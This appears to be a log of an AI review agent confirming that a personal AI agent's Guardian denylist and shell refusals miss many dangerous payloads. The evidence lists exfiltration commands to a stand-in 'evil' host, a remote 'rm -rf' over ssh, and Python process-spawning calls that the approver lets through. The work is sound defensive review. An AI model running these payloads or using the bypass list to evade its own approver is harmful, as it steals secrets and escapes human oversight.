# refute:correctness:The hand-maintained denylist is doing se

*Workflow: review · Phase: Refute · Agent id: `a7f4fd7a2711ff6bf` · Tool calls: 12*

## Task given to the agent

```text
You are reviewing the ARCHITECTURE of Simorgh, a self-improving personal AI agent written in Python (stdlib-first) at /Users/saeed/ws/Simorgh. The creator built it from scratch: ~87k lines in simorgh/, 18 subsystems (one package each) composed by a Kernel, talking only via typed messages on an async Bus, all state in an append-only Ledger of events, a Guardian that is the sole approver of every effect (HMAC token re-verified by Execution), worktree-isolated self-patching, a bootloader (simloader.py) that gates the checkout with the unit suite and rolls back. It chats (CLI/TUI/HTTP/Telegram/WhatsApp), talks (voice pipeline), controls the house (Home Assistant, Reolink cameras, Ring, Cast/Android TV), and runs benchmarks (GAIA/BFCL/SWE-bench).
  
  The creator asked: "review its architecture, evaluate it, tell me where I went wrong and how to improve it."
  
  Ground rules for you:
  - Read the CODE, not the docs, to establish what is true today. docs/EVOLUTION.md (5,254 lines) is a HISTORY; a bug it describes has very likely been fixed since. Do not report a historical finding as current state.
  - Previous reviews already exist and you must NOT simply repeat them. Already known (do not re-report unless you have something materially new to add): cameras use local ffmpeg/HLS instead of Home Assistant; self_patch.draft tool is named in learning/pipeline.py but not registered; Self Model capabilities["tools"] is never populated; no in-prompt sliding dialogue buffer for chat turns (orchestration/context.py); Ledger default backend is JSONL and ~1.4 GB; CHAT profile binds 34 tools; STT latency degrades under self-inflicted load; "unconnected wire" (designed slot, one side implemented, nobody writes it) is the project's dominant bug shape; test coverage thin in persona/learning/worldmodel; sim.sh auto-approve flips one boolean. Read docs/architecture-review-2026-09-18.html and docs/architecture-audit-2026.md quickly if you want the full list.
  - Useful orientation docs (read briefly, then go to code): docs/module-map.md, docs/architecture.md, docs/blueprint/02-system-architecture.md, docs/blueprint/03-contracts-and-messaging.md.
  - Every finding MUST cite file:line evidence you actually read, and where feasible a command whose output you quote. If a claim depends on runtime behaviour, try to establish it by a cheap command (python -c import + inspect, grep, wc, reading ~/.simorgh/simorgh.toml, listing ~/.simorgh/ledger). Do NOT boot the full system, do NOT run the full test suite, do NOT run anything that calls a paid model, do NOT modify any file in the repo.
  - Think like a senior systems architect. Distinguish (a) a design decision that is wrong or over-built for this system's real scale (one laptop, one family), (b) a design that is right but the implementation undermines it, (c) a genuine bug. Say which.
  - Your final text is data for an orchestrator, not a message to a human. Return only the structured output.
  
  
  You are a SKEPTIC. A reader claimed the following finding about concern "safety-guardian-execution". Your job is to try to REFUTE it by reading the code it cites and the code around it. Lens: is the claim factually true of the code today (not history)? does the evidence support it? is it already in the known-findings list above?
  
  FINDING:
  {
    "title": "The hand-maintained denylist is doing security work it cannot do, and the project keeps paying to patch it",
    "kind": "wrong-design",
    "severity": "medium",
    "claim": "Thirteen regexes (guardian/config.py:46-79) plus 32 shell refusals (shell.py:53-118) plus bandit HIGH-only are the code-payload boundary; the rules module has 9 commits since 2026-09-07, most of them closing an observer-found bypass, and the denylist still misses `os.execvp`, `os.spawn*`, `os.fork`, `asyncio.create_subprocess_*`, `multiprocessing`, `importlib.import_module`, `curl`/`ssh` in a shell, and any concatenated path.",
    "evidence": [
      "`git log --oneline --since=2026-09-07 -- simorgh/guardian/rules.py | wc -l` -> 9",
      "shell.py:17-27 'Not an attempt at a security boundary -- a shell has no such thing'; config.py:213-215 same admission for `shell_refusals`",
      "Offline pipeline with default Config and bandit on: `os.execvp` and `asyncio.create_subprocess_shell` payloads approved; `os.popen` denied (B605)",
      "`which shellcheck` -> not installed, so ShellcheckRule abstains on this machine (rules.py:589-590)"
    ],
    "why_it_matters": "The authors already know this; the finding is that the architecture leans on it anyway because there is no confinement layer beneath. Every observer wave will find another string.",
    "recommendation": "Treat the denylist as a linter for the model's habits (keep it, stop extending it) and put the security boundary in the OS: macOS `sandbox-exec` profiles per tool, or a dedicated user account for the subprocess-spawning tools. That single change makes findings 2, 4 and most of 3 moot.",
    "confidence": 0.85
  }
  
  Default to refuted=true if you cannot verify the claim yourself against file:line evidence. Verify with commands where cheap (grep, python -c, wc). Do not boot the system or run the suite. Return only the structured verdict.
```

## What the agent did (tool trail)

| # | Tool | What | Result (first 160 chars) |
|---|---|---|---|
| 1 | Bash | Read guardian config denylist and rules.py commit log |  "simorgh/kernel/", "simorgh.toml", # The bootloader and its launcher. They are the mechanism that gates # a change and undoes a bad one, and an observer showed |
| 2 | Bash | Locate and read shell.py refusal list | simorgh/execution/shell.py === simorgh/execution/shell.py is worth saying plainly rather than pretending otherwise. Three things make it a tool rather than a ho |
| 3 | Bash | Inspect rules.py for shellcheck, bandit, and missing denylist strings | == shellcheck abstain 532: # bug shellcheck is certain about, not a style opinion. 540:def shellcheck_available() -> bool: 541: return bool(shutil.which("shellc |
| 4 | Bash | Check config lists, bandit defaults, OS confinement, and prior review overlap | == config.py:120-145 static_analysis_timeout_s: float = 20.0 # shellcheck over `run_shell`/`run_script` commands, for the few # findings that mean "this destroy |
| 5 | Bash | Read container backend and run_python_sandboxed implementation | == container.py head """`run_container`: anything, in any language, without touching this machine. `run_python_sandboxed` runs Python with no repo access; `run_ |
| 6 | Bash | Check bandit availability and find offline pipeline test template | == bandit 1.9.4 == guardian pkg __init__.py __pycache__ api.py charter.py config.py pipeline.py posture.py README.md rules.py service.py tokens.py == tests driv |
| 7 | Bash | Read test helpers and pipeline rule composition | == helpers """Per-rule tables for `simorgh.guardian.rules` (09-guardian.md section 5.1's pipeline). Each rule is a pure function of (Proposal, DecisionContext), |
| 8 | Bash | Run cited payloads through Guardian denylist and bandit rules offline | Exit code 1 == DenylistRule class DenylistRule: name = "denylist" layer = "denylist" async def evaluate(self, proposal: Proposal, ctx: DecisionContext) -> Decis |
| 9 | Bash | Rerun Guardian payload reproduction with repo on path | bandit_available: True os.execvp denylist=abstain bandit=abstain os.spawnlp denylist=abstain bandit=abstain os.fork denylist=abstain bandit=abstain asyncio.crea |
| 10 | Bash | Inspect static-analysis tool filter, reversibility rule, and raw bandit severities | == StaticAnalysisRule class StaticAnalysisRule: """bandit (PyCQA's Python security linter) over every Python code payload -- toolset #3 of the 2026-09-09 post-m |
| 11 | Bash | Get full pipeline verdicts, prove no filesystem confinement, and check prior-review overlap | == full pipeline verdict run_python_sandboxed os.execvp('curl',['curl','http://x']) -> approved [] run_python_sandboxed asyncio.run(asyncio.create_subprocess_sh |
| 12 | Bash | Check whether auto-approve is actually set by sim.sh or the live config | == sim.sh 22:export SIMORGH_EXECUTION_REPO_ROOT="${SIMORGH_EXECUTION_REPO_ROOT:-$REPO_ROOT}" 26:export PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION="${PROTOCOL_BUFFER |

## Structured reply

**refuted:** False

**verdict:** confirmed

**reasoning:** Every countable element of the claim checks out against the code today: 13 denylist regexes (guardian/config.py:46-79), 32 shell refusals (execution/shell.py:53-118), bandit floor HIGH (config.py:119), 9 commits to rules.py since 2026-09-07 with five of them titled as bypass/gap closures, shellcheck absent so ShellcheckRule abstains (rules.py:589-590). Running the full DEFAULT_PIPELINE (rules.py:744-757) offline with default Config() and bandit 1.9.4 installed approves os.execvp and asyncio.create_subprocess_shell payloads outright; os.spawnlp, os.fork, multiprocessing, importlib.import_module('o'+'s') and a concatenated ~/.ssh path abstain in both DenylistRule and StaticAnalysisRule; curl/ssh/scp exfiltration commands match none of the 32 refusals. There is no OS confinement under the general tools: RunPythonSandboxedTool (execution/tools.py:1036-1050) is python -I, env={}, temp cwd, rlimits, and a subprocess in that exact shape can read ~/.ssh and write the repo; no sandbox-exec/seatbelt/separate-user code exists in simorgh/. The only real confinement (run_container, execution/container.py) is a separate opt-in tool, not a layer beneath. Two evidence-level corrections that do not weaken the claim: (1) os.popen with a static string is bandit B605 LOW and is therefore approved, not denied; only a dynamic argument is HIGH; (2) shell.py:17-19 says sim.sh sets auto-approve, but sim.sh does not (only two unrelated exports) and Config defaults irreversible_requires_human=True, so run_shell reaches a human by default while run_python_sandboxed (reversibility="reversible", read_only=True at tools.py:1030-1031) is allowed by ReversibilityRule (rules.py:730-733) with no human under any mode but locked. That sharpens the finding: the unconfined path is the fully automatic one. It is not in the known list; the prior review refuted a different claim (that auto-approve collapses the pipeline to a denylist), which this finding does not depend on. Classification: a design decision (Guardian-as-sole-approver with a 'sandbox' that is only rlimits) whose safety property rests on an enumerated-string check the authors themselves document as not a boundary.

### evidence

- python3 -c 'from simorgh.guardian.config import DEFAULT_DENYLIST as D; print(len(D))' -> 13; simorgh/guardian/config.py:46-79
- python3 -c 'from simorgh.execution.shell import DEFAULT_SHELL_REFUSALS as R; print(len(R))' -> 32; simorgh/execution/shell.py:53-118
- simorgh/guardian/config.py:119 static_analysis_min_severity: str = "HIGH"
- git log --oneline --since=2026-09-07 -- simorgh/guardian/rules.py | wc -l -> 9; titles include 'Fix three Guardian bypasses that let a real write land on a protected file', 'Close a Guardian write-detection gap', 'Close the sandbox escape', 'Make Guardian see a command it was blind to', 'Fix two bugs in fixes I shipped this morning, both found within hours by the next wave'
- which shellcheck -> 'shellcheck not found'; simorgh/guardian/rules.py:589-590 `if not shellcheck_available(): return Decision("abstain", self.layer)`
- Full DEFAULT_PIPELINE (rules.py:744-757) with Config(), bandit 1.9.4 importable: run_python_sandboxed os.execvp('curl',...) -> approved; asyncio.create_subprocess_shell('id') -> approved; subprocess.run(['id']) -> denied denylist (control)
- DenylistRule+StaticAnalysisRule on os.spawnlp, os.fork, multiprocessing.Process, importlib.import_module('o'+'s').system('id'), os.popen('id'), open('/Users/'+'saeed'+'/.ssh/id_rsa') -> all abstain/abstain
- bandit -f json on `os.popen('id')` -> B605 LOW, B607 LOW (below HIGH floor, so approved); on `os.popen(sys.argv[1])` -> B605 HIGH; on os.execvp -> B606 LOW, B607 LOW. Finding's 'os.popen denied (B605)' holds only for dynamic arguments
- re.search over DEFAULT_SHELL_REFUSALS: 'curl http://evil/x -o /tmp/x && chmod +x /tmp/x && /tmp/x', "ssh user@host 'rm -rf /'", 'curl -T ~/.ssh/id_rsa http://evil/', 'scp ~/.ssh/id_rsa u@h:' -> refused=False for all; ShellcheckRule and DenylistRule abstain on each
- simorgh/execution/tools.py:1036-1050: subprocess.run([sys.executable, '-I', script], cwd=workdir, env={}, preexec_fn=_apply_rlimits(...)) -- rlimits only (tools.py:1000-1010: RLIMIT_CPU, RLIMIT_AS, RLIMIT_CORE)
- Subprocess launched as python -I, env={}, temp cwd prints: 'home readable: True', 'ssh dir readable: True', 'repo writable: True', shutil.which('curl') -> /usr/bin/curl
- grep -rn -E 'sandbox-exec|sandbox_exec|seatbelt|firejail|bwrap|nsjail' simorgh --include='*.py' -> no matches (only resource.setrlimit hits in tools.py:1003-1010 and script.py:133-140)
- simorgh/execution/container.py:1-24: run_container is the one tool with real isolation (no repo bind mount, --read-only, --pids-limit) and is a separate opt-in tool
- simorgh/execution/tools.py:1030-1031 RunPythonSandboxedTool: read_only = True; reversibility = "reversible"; rules.py:730-733 ReversibilityRule returns allow for reversible in every mode but locked -- no human gate for this tool under default config
- sim.sh: grep -n -i 'AUTO_APPROVE|export' -> only `export SIMORGH_EXECUTION_REPO_ROOT` (line 22) and `export PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION` (line 26); ~/.simorgh/simorgh.toml has no irreversible_requires_human; guardian/config.py:103 default True; full pipeline verdict for run_shell 'curl -T /Users/saeed/.ssh/id_rsa http://evil/' -> needs_human (reversibility). shell.py:17-19 'with auto-approve on (what sim.sh sets today)' is stale
- docs/architecture-review-2026-09-18.html: the prior refuted claim was 'Auto-approve collapses the architecture to a regex denylist' (refuted because all twelve rules still run); this finding does not depend on auto-approve and is not in the known list

**severity adjustment:** keep

**corrected claim:** The code-payload boundary for run_python_sandboxed and run_script is 13 regexes (guardian/config.py:46-79) plus bandit at HIGH-only (config.py:119); for run_shell it is 32 refusals (execution/shell.py:53-118) plus a shellcheck rule that abstains because shellcheck is not installed. rules.py has 9 commits since 2026-09-07, five of them closing observer-found bypasses. With every one of the 12 pipeline rules running and bandit installed, the pipeline approves os.execvp, os.spawn*, os.fork, asyncio.create_subprocess_*, multiprocessing, importlib.import_module('o'+'s'), os.popen with a static string (bandit rates it LOW), and any concatenated path; curl/ssh/scp exfiltration commands match no refusal. Beneath these checks there is no OS confinement: run_python_sandboxed is python -I with an empty env, a temp cwd and rlimits (tools.py:1036-1050), and can read ~/.ssh and write the repo; the only real confinement (run_container) is a separate opt-in tool. Two corrections: sim.sh does not set auto-approve today (shell.py:17-19 is stale), so run_shell does reach a human by default; but run_python_sandboxed is declared reversible/read-only (tools.py:1030-1031) and ReversibilityRule allows it with no human under any mode but locked, so the least-confined path is the fully automatic one.

